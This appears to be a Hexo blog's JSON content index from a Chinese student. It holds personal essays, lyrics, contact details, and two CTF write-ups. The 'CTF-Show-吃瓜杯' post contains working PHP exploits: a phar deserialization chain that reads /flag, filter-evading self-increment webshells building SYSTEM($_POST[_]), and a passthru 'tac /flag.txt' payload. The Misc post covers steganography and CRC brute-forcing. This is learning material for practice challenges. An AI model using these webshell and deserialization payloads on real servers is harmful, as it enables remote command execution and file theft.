{"meta":{"title":"忆 执 昔 来 的 旅 途","subtitle":"","description":"生活明朗 万物可爱 人间值得 未来可期","author":"xizhi-future","url":"https://xizhi-future.github.io","root":"/"},"pages":[{"title":"个人介绍","date":"2021-10-01T10:54:20.847Z","updated":"2021-10-01T10:54:20.847Z","comments":true,"path":"about/index.html","permalink":"https://xizhi-future.github.io/about/index.html","excerpt":"","text":"联系方式 Email：&#x31;&#x33;&#55;&#x30;&#x32;&#50;&#48;&#x32;&#x34;&#51;&#x40;&#113;&#113;&#46;&#x63;&#x6f;&#109; QQ：1370220243 个人信息 00后 现大学本科生 个人博客：https://xizhi-future.github.io Github：https://github.com/xizhi-future 描述 本人爱好广泛，琴棋书画、唱歌跳舞样样喜欢，样样都不精通； 一个文静的外表，一个向往技术流的心； 该博客里将会有个人的自学笔记，同时也可能会记录在生活当中的点点滴滴； 希望参观过我博客的网友们可以互相交流，交个朋友呀！"},{"title":"分类","date":"2021-05-23T16:03:00.000Z","updated":"2021-10-01T10:14:53.628Z","comments":false,"path":"categories/index.html","permalink":"https://xizhi-future.github.io/categories/index.html","excerpt":"","text":""},{"title":"随笔","date":"2021-10-01T11:20:52.000Z","updated":"2021-10-01T11:48:17.389Z","comments":false,"path":"essayists/index.html","permalink":"https://xizhi-future.github.io/essayists/index.html","excerpt":"","text":"影视有感 生活杂谈 音乐分享"},{"title":"友情链接","date":"2021-10-01T10:07:13.000Z","updated":"2021-10-01T11:08:35.163Z","comments":false,"path":"friendly-links/index.html","permalink":"https://xizhi-future.github.io/friendly-links/index.html","excerpt":"","text":"努力奋斗IT人 — Angel_Kitty"},{"title":"标签","date":"2021-05-23T16:09:40.000Z","updated":"2021-10-01T10:14:25.513Z","comments":false,"path":"tags/index.html","permalink":"https://xizhi-future.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"世间美好与你环环相扣","slug":"世间美好与你环环相扣","date":"2021-10-01T11:42:25.000Z","updated":"2021-10-01T11:43:15.379Z","comments":true,"path":"2021/10/01/世间美好与你环环相扣/","link":"","permalink":"https://xizhi-future.github.io/2021/10/01/%E4%B8%96%E9%97%B4%E7%BE%8E%E5%A5%BD%E4%B8%8E%E4%BD%A0%E7%8E%AF%E7%8E%AF%E7%9B%B8%E6%89%A3/","excerpt":"","text":"世间美好与你环环相扣偏偏秉烛夜游 午夜星辰 似奔走之友 爱你每个结痂伤口 酿成的陈年烈酒 入喉尚算可口 怎么泪水 还偶尔失守 邀你细看心中缺口 裂缝中留存 温柔 此时已莺飞草长 爱的人正在路上 我知他风雨兼程 途经日暮不赏 穿越人海 只为与你相拥 此刻已皓月当空 爱的人手捧星光 我知他乘风破浪 去了黑暗一趟 感同身受 给你救赎热 望 知道你不能 还要你感受 让星光加了一点彩虹 让樱花偷偷 吻你额头 让世间美好 与你环环相扣 此时已莺飞草长 爱的人正在路上 我知他风雨兼程 途经日暮不赏 穿越人海 只为与你相拥 此刻已皓月当空 爱的人手捧星光 我知他乘风破浪 去了黑暗一趟 感同身受 给你救赎热 望 此时已莺飞草长 爱的人正在路上 我知他风雨兼程 途经日暮不赏 穿越人海 只为与你相拥 此刻已皓月当空 爱的人手捧星光 我知他乘风破浪 去了黑暗一趟 感同身受 给你救赎热 望 知道你不能 还要你感受 让星光加了一点彩虹 当樱花开的纷纷扬扬 当世间美好 与你环环相扣","categories":[{"name":"音乐分享","slug":"音乐分享","permalink":"https://xizhi-future.github.io/categories/%E9%9F%B3%E4%B9%90%E5%88%86%E4%BA%AB/"}],"tags":[],"author":"xizhi-future"},{"title":"唯愿我们","slug":"唯愿我们","date":"2021-10-01T11:40:26.000Z","updated":"2021-10-01T11:41:42.683Z","comments":true,"path":"2021/10/01/唯愿我们/","link":"","permalink":"https://xizhi-future.github.io/2021/10/01/%E5%94%AF%E6%84%BF%E6%88%91%E4%BB%AC/","excerpt":"","text":"唯愿我们从鲜衣怒马到鬓染白发 不过弹指一刹那； 从小桥人家到沧海无涯 匆匆一眼尽繁华。 流年似水， 往事不可追； 光阴似箭， 物是人已非。 让烦恼缠绕心尖， 生活一片颓然； 让痛苦徘徊耳边， 人生全是不满。 感情的遗憾， 不如放手随他。 想送你回家的人， 东西南北都顺路； 想陪你吃饭的人， 酸甜苦辣都可口； 想见你一面的人， 隔山隔海都能来。 生活的刁难， 不如看淡放宽。 生命这一程， 交织着风霜雨雪； 人生这一段， 夹杂着泥泞坎坷。 没有跨不过的河， 没有迈不过的坎。 内心的执迷， 不如随风飘散。 有一往无前， 就有知难而退。 看透了， 便是过眼云烟； 想通了， 不过昙花一现。 不念过去， 不畏将来， 你若不放心上， 岁月便会无恙。 边走边看， 是一种优雅； 边走边忘， 是一份豁达。 敬往事一杯酒， 愿岁月不回头。 唯愿我们： 过去的， 别再遗憾； 未来的， 无须忧虑； 现在的， 加倍珍惜。","categories":[{"name":"生活杂谈","slug":"生活杂谈","permalink":"https://xizhi-future.github.io/categories/%E7%94%9F%E6%B4%BB%E6%9D%82%E8%B0%88/"}],"tags":[],"author":"xizhi-future"},{"title":"难熬的一夜","slug":"难熬的一夜","date":"2021-10-01T11:38:19.000Z","updated":"2021-10-01T11:39:46.754Z","comments":true,"path":"2021/10/01/难熬的一夜/","link":"","permalink":"https://xizhi-future.github.io/2021/10/01/%E9%9A%BE%E7%86%AC%E7%9A%84%E4%B8%80%E5%A4%9C/","excerpt":"","text":"难以想象，现在是8月27日5：56，我现在正躺在床上，写着这篇感想。 这个时间，对于我来说，怎么可能，不在睡觉，可事实是，什么鬼，我简直不敢相信，我入戏就 这么深吗，从前根本没有这样过，整整一个晚上，我满脑子都是剧情，可怕的剧情。夜里，好多 次清醒着，却又不敢睁眼，生怕一睁眼，就会有那张脸出现在我的眼前。要么就是满脑子的男主 女主，我对男主的经历感到很难过，并不是他的错啊，他也很痛苦啊，可是为什么要让他来承受 这一切。哎，总之，我很伤心，更为之心痛。 天色渐渐明朗，我听见了下面阿姨的扫地声，突然就不觉着害怕了，因为，这个世界很美好的不 是吗？你自己不也说过，这个世界，远比你想象的更加美好！太阳总会升起，世界总会迎来光 明。 就当是在给自己壮胆吧，世界的黑暗也总得有人知道，它在帮助我们变得更加勇敢。 2021.8.27 6：12","categories":[{"name":"生活杂谈","slug":"生活杂谈","permalink":"https://xizhi-future.github.io/categories/%E7%94%9F%E6%B4%BB%E6%9D%82%E8%B0%88/"}],"tags":[],"author":"xizhi-future"},{"title":"查无此人","slug":"查无此人","date":"2021-10-01T11:36:26.000Z","updated":"2021-10-01T11:36:47.164Z","comments":true,"path":"2021/10/01/查无此人/","link":"","permalink":"https://xizhi-future.github.io/2021/10/01/%E6%9F%A5%E6%97%A0%E6%AD%A4%E4%BA%BA/","excerpt":"","text":"村上春树说 “你要记得那些黑暗中默默抱紧你的人，逗你笑的人，陪你彻夜聊天的人，坐车来看望你的人，带 着你四处游荡的人，说想念你的人。是这些人组成你生命中一点一滴的温暖，是这些温暖使你成 为善良的人。” 然后，在评论中我看到了，，，查无此人。。。","categories":[{"name":"生活杂谈","slug":"生活杂谈","permalink":"https://xizhi-future.github.io/categories/%E7%94%9F%E6%B4%BB%E6%9D%82%E8%B0%88/"}],"tags":[],"author":"xizhi-future"},{"title":"胡适与江冬秀","slug":"胡适与江冬秀","date":"2021-10-01T11:34:34.000Z","updated":"2021-10-01T11:35:33.614Z","comments":true,"path":"2021/10/01/胡适与江冬秀/","link":"","permalink":"https://xizhi-future.github.io/2021/10/01/%E8%83%A1%E9%80%82%E4%B8%8E%E6%B1%9F%E5%86%AC%E7%A7%80/","excerpt":"","text":"她并非小肚鸡肠，她能容忍胡适的风花雪月，但她就是不愿意原谅，曾经那么信任的两个人，嘴 上说着表哥表妹，背地里却狠狠背叛了她。 张爱玲说：”他们（胡适和江冬秀）是旧式婚姻罕有的幸福例子。” 她看多了旧式婚姻之中女人的悲剧，她绝对不能做怨妇，不能被丈夫牵着鼻子走，而是让胡适在 生活中依赖她，在心中敬重她，在感情上不能轻易放弃她。 胡适和江冬秀弯弯绕绕，终于走向白头功德圆满，他从刚开始的衡量算计，委屈求全，到真正为 江冬秀折服。世人笑他一位西装客娶了小脚女，哪知在江冬秀的人生哲理前，胡适的那些小聪明 真的就不算什么事儿了。 思君不见，倍感思君；别离难忍，忍痛别离。","categories":[{"name":"生活杂谈","slug":"生活杂谈","permalink":"https://xizhi-future.github.io/categories/%E7%94%9F%E6%B4%BB%E6%9D%82%E8%B0%88/"}],"tags":[],"author":"xizhi-future"},{"title":"CTF-Show-吃瓜杯","slug":"CTF-Show-吃瓜杯","date":"2021-10-01T11:19:34.000Z","updated":"2021-10-01T11:20:18.220Z","comments":true,"path":"2021/10/01/CTF-Show-吃瓜杯/","link":"","permalink":"https://xizhi-future.github.io/2021/10/01/CTF-Show-%E5%90%83%E7%93%9C%E6%9D%AF/","excerpt":"CTF Show 吃瓜杯篇。","text":"CTF Show 吃瓜杯篇。 CTF Show 吃瓜杯热身123456789101112131415161718&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if($num==4476)&#123; die(&quot;no no no!&quot;); &#125; if(preg_match(&quot;/[a-z]|\\./i&quot;, $num))&#123; die(&quot;no no no!!&quot;); &#125; if(!strpos($num, &quot;0&quot;))&#123; die(&quot;no no no!!!&quot;); &#125; if(intval($num,0)===4476)&#123; echo $flag; &#125;&#125; 123?num=%20010574?num=%0c010574?num=%0a010574 ATTupzip 文件上传 + 文件包含 file_get_contents —&gt; phar 反序列化 文件内容过滤 &lt;? php ，过滤 &lt;? ，无法正常解析为 php 代码 上传成功发现：序列化与反序列化 123456789101112131415161718192021class View &#123; public $fn; public function __invoke()&#123; $text = base64_encode(file_get_contents($this-&gt;fn)); echo &quot;&lt;script&gt;alert(&#x27;&quot;.$text.&quot;&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;; &#125;&#125;class Fun&#123; public $fun = &quot;:)&quot;; public function __toString()&#123; $fuc = $this-&gt;fun; $fuc(); return &quot;&lt;script&gt;alert(&#x27;Be a happy string~&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;; &#125; public function __destruct() &#123; echo &quot;&lt;script&gt;alert(&#x27;Just a fun &quot;.$this-&gt;fun.&quot;&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;; &#125;&#125;$filename = $_POST[&quot;file&quot;];$stat = @stat($filename); 12__toString() //把类当作字符串使用时触发 echo 对象; $text=$test+$对象； __invoke() //当尝试以调用函数的方式调用一个对象时，该方法会被自动调用 生成 .phar 文件： 我们的目的是成功创建 View 对象然后成功调用 __invoke() 方法，利用 file_get_contents 来读取到文件中的内容。 1234567891011121314151617181920212223242526272829303132&lt;?phpclass View&#123; public $fn; public function __invoke()&#123; $text = base64_encode(file_get_contents($this-&gt;fn)); echo &quot;&lt;script&gt;alert(&#x27;&quot;.$text.&quot;&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;; &#125;&#125;class Fun&#123; public $fun=&#x27;:)&#x27;; public function __toString()&#123; $fuc = $this-&gt;fun; $fuc(); return &quot;&lt;script&gt;alert(&#x27;Be a happy string~&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;; &#125; public function __destruct() &#123; echo &quot;&lt;script&gt;alert(&#x27;Just a fun &quot;.$this-&gt;fun.&quot;&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;; &#125;&#125;$phar = new Phar(&#x27;123.phar&#x27;);$phar -&gt; stopBuffering();$phar -&gt; setStub(&#x27;GIF89a&#x27;.&#x27;&amp;lt;?= __HALT_COMPILER(); ?&amp;gt;&#x27;);$b = new Fun();$b-&gt;fun= new Fun();$b-&gt;fun-&gt;fun=new View(); # 当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用$b-&gt;fun-&gt;fun-&gt;fn=&#x27;/flag&#x27;;$phar -&gt; addFromString(&#x27;test.txt&#x27;,&#x27;test&#x27;);$phar -&gt; setMetadata($b);$phar -&gt; stopBuffering(); &lt;? 过滤，使用 实体html 编码代替 ，&amp;lt; &amp;gt; 访问，生成 123.phar 更改后缀得到 123.zip 上传 查询 123.zip 1file=phar://123.zip 魔女 注册 注册成功，登录 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263layui.use([&#x27;layer&#x27;, &#x27;form&#x27;,&#x27;table&#x27;,&#x27;element&#x27;], function()&#123; var layer = layui.layer ,form = layui.form ,table = layui.table ,element = layui.element &#125;); function home()&#123; $.cookie(&#x27;m&#x27;,&#x27;main&#x27;); $.cookie(&#x27;ctfshow&#x27;,&#x27;0x36d|&#x27;+&#x27;&#x27;); location.replace(location.href); &#125; function logout()&#123; $.cookie(&#x27;m&#x27;,&#x27;logout&#x27;); $.cookie(&#x27;ctfshow&#x27;,&#x27;0x36d|&#x27;+&#x27;&#x27;); location.replace(location.href); &#125; function saveAvatar()&#123; $.cookie(&#x27;m&#x27;,&#x27;download&#x27;); $.cookie(&#x27;ctfshow&#x27;,&#x27;0x36d|&#x27;+&#x27;avatar.jpg|true&#x27;); window.open(location.href); &#125; function avatar()&#123; layer.prompt(&#123; formType: 0, value: &#x27;http://xxx.com/x.jpg(其他格式无效)&#x27;, title: &#x27;修改头像&#x27;, &#125;, function(value, index, elem)&#123; layer.close(index); $.cookie(&#x27;ctfshow&#x27;,&#x27;0x36d|&#x27;+&#x27;xixi|&#x27;+value); $.cookie(&#x27;m&#x27;,&#x27;changeavatar&#x27;); location.replace(location.href); &#125;); &#125; function profile()&#123; $.cookie(&#x27;m&#x27;,&#x27;page&#x27;); $.cookie(&#x27;ctfshow&#x27;,&#x27;0x36d|&#x27;+&#x27;&#x27;); location.replace(location.href); &#125; function changePSW()&#123; layer.prompt(&#123; formType: 0, value: &#x27;请输入当前密码&#x27;, title: &#x27;修改密码&#x27;, &#125;, function(value, index, elem)&#123; $.cookie(&#x27;ctfshow&#x27;,&#x27;0x36d|&#x27;+value); layer.close(index); layer.prompt(&#123; formType: 0, value: &#x27;请输入新密码&#x27;, title: &#x27;修改密码&#x27;, &#125;, function(value, index, elem)&#123; layer.close(index); $.cookie(&#x27;ctfshow&#x27;,$.cookie(&#x27;ctfshow&#x27;)+&#x27;|&#x27;+value); $.cookie(&#x27;m&#x27;,&#x27;changepwd&#x27;); location.replace(location.href); &#125;); &#125;); &#125; shellme_Revenge 1/?looklook=1 1&lt;?phperror_reporting(0);if ($_GET[&#x27;looklook&#x27;])&#123; highlight_file(__FILE__);&#125;else&#123; setcookie(&quot;hint&quot;, &quot;?looklook&quot;, time()+3600);&#125;if (isset($_POST[&#x27;ctf_show&#x27;])) &#123; $ctfshow = $_POST[&#x27;ctf_show&#x27;]; if (is_string($ctfshow) || strlen($ctfshow) &lt;= 107) &#123; if (!preg_match(&quot;/[!@#%^&amp;*:&#x27;\\&quot;|`a-zA-BD-Z~\\\\\\\\]|[4-9]/&quot;,$ctfshow))&#123; eval($ctfshow); &#125;else&#123; echo(&quot;fucccc hacker!!&quot;); &#125; &#125;&#125; else &#123; phpinfo();&#125;?&gt; assert() 1&lt;?php$_=[];$_=@&quot;$_&quot;; // $_=&#x27;Array&#x27;;$_=$_[&#x27;!&#x27;==&#x27;@&#x27;]; // $_=$_[0];$___=$_; // A$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__; // S$___.=$__; // S$__=$_;$__++;$__++;$__++;$__++; // E $___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$___.=$__;$____=&#x27;_&#xeval($___($_[_])); // ASSERT($_POST[_]); system() 1&lt;?php$_=C;//$_=$_[0]; //Cprint_r($_);$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___=$__; // Sprint_r($__);//$__=$_;$__++;$__++;$__++;$__++;$__++;$__++; // Y$___.=$__;print_r($__);$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__; // Sprint_r($__);$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__; // Tprint_r($__);$__=$_;$__++;$__++;$___.=$__; // Eprint_r($__);$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__; // Mprint_r($__);print_r($___); //SYSTEM$____=_;$__=$_;//print_r($_);$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P$____.=$__;print_r($__);$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O$____.=$__;print_r($__);$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S$____.=$__;print_r($__);$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$____.=$__;print_r($____);//_POSTprint_r($___);//SYSTEM$_=$$____;eval($___($_[_])); // SYSTEM($_POST[_]); 1&lt;?phpx27;_&#x27;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;evaleval($___($_[_]));highlight_file(__FILE__);$a = $_GET[&#x27;a&#x27;];if (!preg_match(&quot;/[!@#%^&amp;*:&#x27;\\&quot;|`a-zA-BD-Z~\\\\\\\\]|[4-9]/&quot;,$ctfshow))&#123; echo &#x27;111&#x27;; eval($a);&#125; 1#get?looklook=1#postctf[showamp;_=ls; 长度限制： 1# get?looklook=1&amp;1=passthru&amp;2=tac /flag.txt# postctf[show=$_=C;$_++;$C=++$_;$_++;$C_=++$_;$_=(C/C.C)&#123;0&#125;;$_++;$_++;$_++;$_++;$_++;$_=_.$C_.$C.++$_;$&#123;$_&#125;&#123;1&#125;($&#123;$_&#125;&#123;2&#125;); 吃瓜 50 4B 03 04 ZIP文件 这是用来迷惑的 存在一个文本文档，是个 图片，浏览器访问 扫描得到 cfhwc19abika_etso{h_u_e_ui1} 查看图片属性 1✿❇✼❄✿❇✼❂❃❆✿✽❂❁❉✼==# 不知道怎末用 二、总结命令执行做题思路 一眼就有思路的直接掠过 一眼没有思路的，首先根据正则的过滤分类，决定思路 有回显？无回显？ eval exec eval 还是 system 无字母数字类？ 异或？或？取反？自增？ 过滤 ; 过滤 ‘ ‘ “ “ 找 phpinfo() 看被 ban 的函数名","categories":[{"name":"CTF Show","slug":"CTF-Show","permalink":"https://xizhi-future.github.io/categories/CTF-Show/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xizhi-future.github.io/tags/CTF/"}],"author":"xizhi-future"},{"title":"CTF-Show-Misc入门","slug":"CTF-Show-Misc入门","date":"2021-10-01T11:17:47.000Z","updated":"2021-10-01T11:18:54.358Z","comments":true,"path":"2021/10/01/CTF-Show-Misc入门/","link":"","permalink":"https://xizhi-future.github.io/2021/10/01/CTF-Show-Misc%E5%85%A5%E9%97%A8/","excerpt":"CTF Show Misc 入门篇。","text":"CTF Show Misc 入门篇。 Misc 入门1.1 misc 1 — QQ截图 直接识别图片内容 图片直接是这个，我们可以 QQ 截图，使用当中的 屏幕识别 即可识别出文字 1.2 misc 2 — png 图片识别 记事本打开是这样，那肯定不是 .txt 文本文件 使用 Editor010 打开 说明这是 png 文件，修改后缀，然后 QQ 屏幕识图即可 补充知识：Python3 进行图片识别 https://segmentfault.com/a/1190000014091417 1.3 misc 3 — 查看 bpg 图片是 bpg 图片，需要专门的查看工具 https://bellard.org/bpg/ 12# 使用\\bpj\\bpgview.exe misc3.bpg 1.4 misc 4 — 图片格式 + 文件头图片格式 JPEG文件头：FF D8 FF 文件尾：FF D9 TGA未压缩的前4字节 00 00 02 00RLE压缩的前5字节 00 00 10 00 00 PNG 文件头：89 50 4E 47 0D 0A 1A 0A 文件尾：AE 42 60 82 GIF 文件头：47 49 46 38 39(37) 61 文件尾：00 3B BMP 文件头：42 4D 文件头标识(2 bytes) 42(B) 4D(M) TIFF (tif) 文件头：49 49 2A 00 ico 文件头：00 00 01 00 Adobe Photoshop (psd) 文件头：38 42 50 53 一个一个查看，修改后缀 1.txt png 2.txt jpg 3.txt bmp 4.txt gif 5.txt tif 6.txt webp 1.5 misc 5 — png 文件尾 添内容 010打开 发现在 png 的文件尾后面多出了 1.6 misc 6 — jpg 文件 添内容 1.7 misc 7 — flag在图片文件信息中flag在图片文件信息中。 常用到的手段还有 右键–属性 工具 图虫查看器 能够查看图片的详细信息 1.8 misc 8 — flag在图片文件中图片文件中 — binwalk foremostflag在图片文件中图片文件中。 010 打开 可以发现，该 png 图片当中 还包含着一张 png 图片 图片隐藏文件 binwalk foremost https://blog.csdn.net/Sc0fie1d/article/details/101602492 1.9 misc 9 — flag在图片块里 1.10 misc 10 — flag在图片数据里 两个 IDAT 块 binwalk 工具 解释：zlib 是 PNG IDAT 块数据可选的压缩格式 题者自己生成了一段 zlib 压缩数据，然后加上长度位、标识位、与 CRC 校验位，将其伪装成了一个 IDAT 块，插在图片当中 而 binwalk 会自动找到 zlib 块并提取出来解压，所以最终得到的提取结果中就含有 flag 了 1.11 misc 11 — flag在另一张图里 两个 IDAT 块 再次使用上一关的解法，不可行 搜集资料之后，必须首先将多余的那个 IDAT 块删除才可 工具 tweakpng 将第一个 IDAT 块右键删除即可 ctfshow{44620176948fa759d3eeafeac99f1ce9} 1.12 misc 12 — flag在另一张图里flag在另一张图里。 与上一关的做法相同，只不过，不确定删除几个 IDAT 块，每次删完一个保存尝试查看即可 1.13 misc 13 — flag位置在图片末尾flag位置在图片末尾。 可以看到一部分类似 flag 的字符串 我们将乱七八糟的删除即可，每隔一个删除一个 1.14 misc 14 — flag在那张图里flag在那张图里。 记得从 FF D8 开始 新建一个新的文件 jpg 打开 注意：QQ识图 有时不准确，比如 0 和 8 1.15 misc 15 — flag被跳过去了 1.16 misc 16 — flag在图片数据里flag在图片数据里。 binwalk 提取文件 1.17 misc 17 — flag在图片数据里 — zstegflag在图片数据里。 zsteg 安装 及 使用 zsteg可以检测PNG和BMP图片里的隐写数据。 目前，zsteg支持检测： LSB steganography in PNG &amp; BMPzlib-compressed dataOpenStegoCamouflage 1.2.1LSB with The Eratosthenes set 1zsteg misc17.png 12zsteg -E &quot;extradata:0&quot; misc17.png &gt; 1.txtbinwalk -e 1.txt 1.18 misc 18 — flag在标题、作者、照相机和镜头型号里flag在标题、作者、照相机和镜头型号里。 右键属性查看 1.19 misc 19 — flag在主机上的文档名里 1.20 misc 20 — flag在评论里图虫查看器 https://exif.tuchong.com/ ctfshow{c97964b1aecf06e1d79c21ddad593e42} 1.21 misc 21 — flag在序号里flag在序号里。 12print(hex(3902939465)+hex(2371618619)+hex(1082452817)+hex(2980145261))0xe8a221490x8d5c073b0x4084eb510xb1a1686d 删掉 0x 即可 1.22 misc22 — flag 在图片里 — 缩略图 — exiftool 设置为平铺之后，可以依稀看出来该图片下方有着黄色的一行，但是点击查看之后又看不出来 这是一种缩略图隐写的方式，叫做thumbnail隐写 exiftool 1exiftool.exe -ThumbnaiImage -b misc22.jpg &gt; 111.jpg ctfshow{dbf7d3f84b0125e833dfd3c80820a129} 1.23 misc23 — flag在时间里 —exiftool 查看实践 1exiftool.exe misc23.psd ctfshow{}, UnixTimestamp, DECtoHEX, getflag Unix 时间戳，十进制到十六进制，获取 flag 1997:09:22 02:17:02+08:00 2055:07:15 12:14:48+08:00 2038:05:05 16:50:45+08:00 1984:08:03 18:41:46+08:00 在线时间戳转换 874865822 2699237688 2156662245 460377706 12print(hex(874865822)+hex(2699237688)+hex(2156662245)+hex(460377706))0x3425649e0xa0e319380x808c0de50x1b70ce6a ctfshow{3425649ea0e31938808c0de51b70ce6a} 1.24 misc41（本题为Misc入门图片篇和愚人节比赛特别联动题）H4ppy Apr1l F001’s D4y！愚人节到了，一群笨蛋往南飞，一会儿排成S字，一会儿排成B字。 H4ppy Apr1l F001’s D4y！ 这是个提示：F001，010 搜索 F001，发现存在大量，组成了刺目的形状，读取出来即可 ctfshow{fcbd427caf4a52f1147ab44346cd1cdd} 1.25 misc24 — flag在图片上面 — bmp 图片改高度bmp 位图文件解析 900*150=135000个像素大小 该图片总共 675056 个字节，文件尾的位置在675053字节处(后面两个字节是windows的”补0”) 文件头共 53 字节 每个像素点由3个字节（十六进制码6位）表示，每个字节负责控制一种颜色，分别为蓝（Blue）、绿（Green）、红（Red） (675053-53)/3=225000 得到真实的像素大小 该题只有高不对，则正确的宽依旧是 900 得到 225000/900=高 250 修改高为 hex(250)=FA 还是 0096 的位置修改 保存得到flag 1.26 misc25 — flag在图片下面 — png 图片改高度 0096 改成 0196 0296 都可 1.27 misc26 — flag还是在图片下面，但到底有多下面？ ctfshow{94aef1 +True height(hex) of this picture+ 087a7ccf2e28e742efd704c} https://blog.csdn.net/weixin_44145452/article/details/109612189 会提示校验码错误 CRC32是有哪些字节构成的？ PNG文件中总是以固定的八个字节开头 89 50 4E 47 0D 0A 1A 0A 数据块长度3 00 00 00 0D 文件头数据块标示IDCH 49 48 44 52 13位数据块（IHDR）下面为宽和高 00 00 07 7E 00 00 03 60 这5个字节依次为Bit depth，ColorType，Compression method，Filter method，Interlace method 08 06 00 00 00 接下来的四字节为该png图片的CRC校验码 7D C7 3F 7F CRC校验码，由IDCH和IHDR共十七位字节进行crc计算得到 解决方法：1.简单点的隐写题，可以直接修改宽高，然后显示flag2.那么如果修改宽高，并不会直接看到flag，需要放入stegsolve里或者做其它的进一步处理时。这里会产生一个问题，那就是修改过宽高的图片stegsolve无法打开，提示IO错误。这是因为png图像的IHDR段中的高宽被修改，导致计算出来的CRC不正确，所以无法正确读取。通过python2脚本来获取图片高度 获取图片高度 1234567891011# -*- coding: utf-8 -*-import binasciiimport structcrc32key = 0x7DC73F7Ffor i in range(0, 65535): height = struct.pack(&#x27;&gt;i&#x27;, i) #CRC: 7DC73F7F data = &#x27;\\x49\\x48\\x44\\x52\\x00\\x00\\x07\\x7E&#x27; + height + &#x27;\\x08\\x06\\x00\\x00\\x00&#x27; crc32result = binascii.crc32(data) &amp; 0xffffffff if crc32result == crc32key: print &#x27;&#x27;.join(map(lambda c: &quot;%02X&quot; % ord(c), height)) 爆破图片正常宽高 1import structimport zlibdef hexStr2bytes(s): b = b&quot;&quot; for i in range(0,len(s),2): temp = s[i:i+2] b +=struct.pack(&quot;B&quot;,int(temp,16)) return bstr1=&quot;49484452&quot; #文件头数据块标示IDCHstr2=&quot;0806000000&quot; #五字节：Bit depth，ColorType，Compression method，Filter method，Interlace methodbytes1=hexStr2bytes(str1)bytes2=hexStr2bytes(str2)wid,hei = 900,150 #宽高 像素crc32 = &quot;0xec9ccbc6&quot; #校验码for w in range(wid,wid+2000): for h in range(hei,hei+2000): width = hex(w)[2:].rjust(8,&#x27;0&#x27;) height = hex(h)[2:].rjust(8,&#x27;0&#x27;) bytes_temp=hexStr2bytes(width+height) if eval(hex(zlib.crc32(bytes1+bytes_temp+bytes2))) == eval(crc32): print(hex(w),hex(h)) ctfshow{94aef1 +True height(hex) of this picture+ 087a7ccf2e28e742efd704c} 1ctfshow&#123;94aef125e087a7ccf2e28e742efd704c&#125; 1.28 misc27 — flag在图片下面 寻找 0096 1.29 misc28 — flag在图片下面 — gif9600 更改为 FF00，两处 gif.bt ??????? 1.30 misc29 — flag在图片下面9600 更改为 FF00，十处，然后 stegsolve 逐帧查看 1.31 misc30 — 正确的宽度是950修改 bmp 宽度为 hex(950) 1.32 misc31 — 高度是正确的，但正确的宽度是多少呢同 misc24 图片总共 487256 字节，去掉文件尾，得到 487253 900*150=135000 文件头 53 字节 (487253-53)/3=162400 高正确，150 宽：162400/150=1082.67 改宽为 1082 1.33 misc32 — 高度是正确的，但正确的宽度是多少呢png 计算宽高 1import structimport zlibdef hexStr2bytes(s): b = b&quot;&quot; for i in range(0,len(s),2): temp = s[i:i+2] b +=struct.pack(&quot;B&quot;,int(temp,16)) return bstr1=&quot;49484452&quot; #文件头数据块标示IDCHstr2=&quot;0802000000&quot; #五字节：Bit depth，ColorType，Compression method，Filter method，Interlace methodbytes1=hexStr2bytes(str1)bytes2=hexStr2bytes(str2)wid,hei = 900,150 #宽高 像素crc32 = &quot;0xe14a4c0b&quot; #校验码for w in range(wid,wid+2000): for h in range(hei,hei+2000): width = hex(w)[2:].rjust(8,&#x27;0&#x27;) height = hex(h)[2:].rjust(8,&#x27;0&#x27;) bytes_temp=hexStr2bytes(width+height) if eval(hex(zlib.crc32(bytes1+bytes_temp+bytes2))) == eval(crc32): print(hex(w),hex(h)) 0x414 0x96 1.34 misc33 — 出题人丧心病狂，把高度也改了1import zlibimport struct# 同时爆破宽度和高度filename = &quot;misc33.png&quot;with 